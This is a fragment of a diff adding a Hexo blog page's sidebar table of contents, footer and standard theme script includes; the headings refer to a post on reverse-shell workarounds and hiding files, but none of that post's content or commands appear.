class="nav-item nav-level-2"><a class="nav-link" href="#nc-缺少-e-参数的解决方式"><span class="nav-number">2.1.</span> <span class="nav-text">nc 缺少 -e 参数的解决方式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#dev-tcp"><span class="nav-number">2.1.1.</span> <span class="nav-text">dev/tcp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mknod-FIFO"><span class="nav-number">2.1.2.</span> <span class="nav-text">mknod FIFO</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#隐藏文件-文件夹"><span class="nav-number">2.2.</span> <span class="nav-text">隐藏文件/文件夹</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#隐藏"><span class="nav-number">2.3.</span> <span class="nav-text">隐藏</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考"><span class="nav-number">3.</span> <span class="nav-text">参考</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">blackj liuyun</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">23.1k</span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
